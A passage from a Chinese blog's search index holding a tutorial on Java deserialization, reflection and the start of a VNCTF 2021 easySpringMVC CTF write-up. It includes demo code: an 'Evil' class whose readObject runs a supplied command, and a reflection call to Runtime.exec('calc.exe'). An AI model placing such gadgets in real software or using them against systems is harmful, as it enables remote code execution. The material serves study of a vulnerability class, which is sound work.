<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java反序列化总结</title>
      <link href="/2021/06/22/java-fan-xu-lie-hua-ru-men/"/>
      <url>/2021/06/22/java-fan-xu-lie-hua-ru-men/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章初步学习java反序列化以及反序列化利用需要掌握的java反射机制，文章内容借鉴多篇前人文章，总结仅供学习和参考</p><h1 id="java反序列化入门（一）初识JAVA反序列化漏洞"><a href="#java反序列化入门（一）初识JAVA反序列化漏洞" class="headerlink" title="java反序列化入门（一）初识JAVA反序列化漏洞"></a>java反序列化入门（一）初识JAVA反序列化漏洞</h1><h2 id="0x0-java序列化与反序列化"><a href="#0x0-java序列化与反序列化" class="headerlink" title="0x0 java序列化与反序列化"></a>0x0 java序列化与反序列化</h2><h3 id="0x00-简单介绍"><a href="#0x00-简单介绍" class="headerlink" title="0x00 简单介绍"></a>0x00 简单介绍</h3><p>Java 序列化是指把 Java 对象转换为字节序列的过程<br>ObjectOutputStream类的 writeObject() 方法可以实现序列化</p><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程<br>ObjectInputStream 类的 readObject() 方法用于反序列化。</p><p>实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的<br>(用transient关键字修饰的属性除外，不参与序列化过程)</p><p>举例：</p><p>需要序列化的类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> serialize<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化与反序列化</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> serialize<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        User user<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"leixiao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializeData<span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputStream fout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"user.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fout<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>serializeData<span class="token punctuation">)</span><span class="token punctuation">;</span>        fout<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User user2<span class="token operator">=</span><span class="token punctuation">(</span>User<span class="token punctuation">)</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>serializeData<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">final</span> Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ByteArrayOutputStream btout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>btout<span class="token punctuation">)</span><span class="token punctuation">;</span>        objOut<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> btout<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ByteArrayInputStream btin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>btin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> objIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/0.png"></div><h2 id="0x01-重要函数readObject方法"><a href="#0x01-重要函数readObject方法" class="headerlink" title="0x01 重要函数readObject方法"></a>0x01 重要函数readObject方法</h2><p><strong>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用，readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法</strong>。如果该方法书写不当的话就有可能引发恶意代码的执行</p><p>重写readObject函数</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> evilSerialize<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> String cmd<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream stream<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        stream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主函数调用该函数进行反序列化</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> evilSerialize<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Evil evil<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        evil<span class="token punctuation">.</span>cmd<span class="token operator">=</span><span class="token string">"calc"</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializeData<span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span>evil<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span>serializeData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">final</span> Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ByteArrayOutputStream btout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>btout<span class="token punctuation">)</span><span class="token punctuation">;</span>        objOut<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> btout<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ByteArrayInputStream btin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>btin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> objIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/1.png"></div>实际中反序列化漏洞的构造比较复杂，而且需要借助Java的一些特性如Java的反射<h2 id="0x1-Java反射"><a href="#0x1-Java反射" class="headerlink" title="0x1 Java反射"></a>0x1 Java反射</h2><h3 id="0x10-Java反射的定义"><a href="#0x10-Java反射的定义" class="headerlink" title="0x10 Java反射的定义"></a>0x10 Java反射的定义</h3><p>对于任意一个类，都能够得到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。</p><p>其实在Java中定义的一个类本身也是一个对象，即java.lang.Class类的实例，这个实例称为类对象</p><p>类对象表示正在运行的 Java应用程序中的类和接口<br>类对象没有公共构造方法，由Java虚拟机自动构造<br>类对象用于提供类本身的信息，比如有几种构造方法，有多少属性，有哪些普通方法<br>要得到类的方法和属性，首先就要得到该类对象</p><h3 id="0x11-获取类对象"><a href="#0x11-获取类对象" class="headerlink" title="0x11 获取类对象"></a>0x11 获取类对象</h3><p>假设现在有个user类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> reflection<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要获取该类对象一般有三种方法</p><ul><li>class.forName(“reflection.User”)</li><li>User.class</li><li>new User().getClass()</li></ul><p>最常用的是第一种，通过一个字符串即类的全路径名就可以得到类对象，另外两种方法依赖项太强</p><h3 id="0x12-利用类对象创建对象"><a href="#0x12-利用类对象创建对象" class="headerlink" title="0x12 利用类对象创建对象"></a>0x12 利用类对象创建对象</h3><p>与new直接创建对象不同，反射是先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> reflection<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CreateObject</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class <span class="token class-name">UserClass</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflection.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor<span class="token operator">=</span>UserClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User user<span class="token operator">=</span><span class="token punctuation">(</span>User<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"leixiao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>getConstructor(Class…&lt;?&gt; parameterTypes)    获得该类中与参数类型匹配的公有构造方法</li><li>getConstructors()    获得该类的所有公有构造方法</li><li>getDeclaredConstructor(Class…&lt;?&gt; parameterTypes)    获得该类中与参数类型匹配的构造方法</li><li>getDeclaredConstructors()    获得该类所有构造方法</li></ul><h3 id="0x13-通过反射调用方法"><a href="#0x13-通过反射调用方法" class="headerlink" title="0x13 通过反射调用方法"></a>0x13 通过反射调用方法</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> reflection<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CallMethod</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class <span class="token class-name">UserClass</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflection.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor<span class="token operator">=</span>UserClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User user<span class="token operator">=</span><span class="token punctuation">(</span>User<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"leixiao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method method <span class="token operator">=</span> UserClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获得这个类的某个方法，第一个参数是方法名字，第二个参数是参数类型</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token string">"l3yx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// invoke相当于调用上面声明要调用的setName方法，将l3yx传入user中</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>getMethod(String name, Class…&lt;?&gt; parameterTypes)    获得该类某个公有的方法</li><li>getMethods()    获得该类所有公有的方法</li><li>getDeclaredMethod(String name, Class…&lt;?&gt; parameterTypes)    获得该类某个方法</li><li>getDeclaredMethods()    获得该类所有方法</li></ul><h3 id="0x14-通过反射访问属性"><a href="#0x14-通过反射访问属性" class="headerlink" title="0x14 通过反射访问属性"></a>0x14 通过反射访问属性</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> reflection<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AccessAttribute</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class <span class="token class-name">UserClass</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflection.User"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor<span class="token operator">=</span>UserClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User user<span class="token operator">=</span><span class="token punctuation">(</span>User<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"leixiao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field<span class="token operator">=</span> UserClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获得某个属性</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// name是私有属性，需要先设置可访问</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token string">"l3yx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 这个还是调用setName方法吗</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>getField(String name)    获得某个公有的属性对象</li><li>getFields()    获得所有公有的属性对象</li><li>getDeclaredField(String name)    获得某个属性对</li><li>getDeclaredFields()    获得所有属性对象</li></ul><h3 id="0x15-利用java反射执行代码"><a href="#0x15-利用java反射执行代码" class="headerlink" title="0x15 利用java反射执行代码"></a>0x15 利用java反射执行代码</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> reflection<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exec</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//java.lang.Runtime.getRuntime().exec("calc.exe");</span>        Class <span class="token class-name">runtimeClass</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object runtime<span class="token operator">=</span>runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// getRuntime是静态方法，invoke时不需要传入对象，获得getRuntime方法（getMethod获得某个类公有的方法），invoke等于是调用了。</span>        runtimeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获得exec方法，invoke调用传入两个参数？？</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码中,利用了Java的反射机制把我们的代码意图都利用字符串的形式进行体现，使得原本应该是字符串的属性，变成了代码执行的逻辑，而这个机制也是后续的漏洞使用的前提</p><h1 id="java反序列化入门（二）VNCTF-2021-easySpringMVC"><a href="#java反序列化入门（二）VNCTF-2021-easySpringMVC" class="headerlink" title="java反序列化入门（二）VNCTF-2021 easySpringMVC"></a>java反序列化入门（二）VNCTF-2021 easySpringMVC</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>为了方便调试，还是决定在本地搭建好环境</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/2.png"></div><p>管理员权限可以上传图片？</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/3.png"></div><h2 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>/WEB-INF/applicationContext.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">></span></span>org.springframework.web.context.ContextLoaderListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>clientinfo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.filters.ClentInfoFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>        <span class="token 